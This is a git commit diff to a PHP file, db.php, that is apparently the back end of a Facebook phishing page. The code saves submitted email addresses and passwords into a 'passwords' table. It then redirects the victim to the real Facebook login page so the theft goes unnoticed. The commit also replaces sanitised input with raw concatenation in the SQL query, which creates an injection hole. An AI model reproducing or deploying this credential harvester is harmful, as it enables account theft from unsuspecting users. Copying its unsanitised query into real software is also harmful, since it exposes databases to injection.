c37d903047928424e89d9bbfddac020f03182725
valeri879 <valeri.kharitonashvili1@gmail.com>
2016-05-23 12:55:48 +0400

    final

--- db.php
+++ db.php
@@ -14,23 +14,21 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 
-if ($conn) {
-    echo "Connection ON";
-} else {
-    echo "Error: " . $sql . "<br>" . $conn->error;
-}
-
 // insert into database
 
-if ($_POST['submit'] === "submit") {
+if (isset($_POST['email'])) {
     $email = $_POST['email'];
     $password = $_POST['pass'];
 
-    $sql = "INSERT INTO passwords (UserName, Password) VALUES (" . PrepSQL($email) . ", " . PrepSQL($password) . ")";
+    $sql = "INSERT INTO passwords (UserName, Password) VALUES ('" . $email . "', '" . $password . "')";
 
-    mysqli_query($sql);
+    mysqli_query($conn, $sql);
 }
 
-
 $conn->close();
+
 ?>
+
+<script type="text/javascript">
+	window.location.replace("https://www.facebook.com/login.php?login_attempt=1&lwv=111");
+</script>
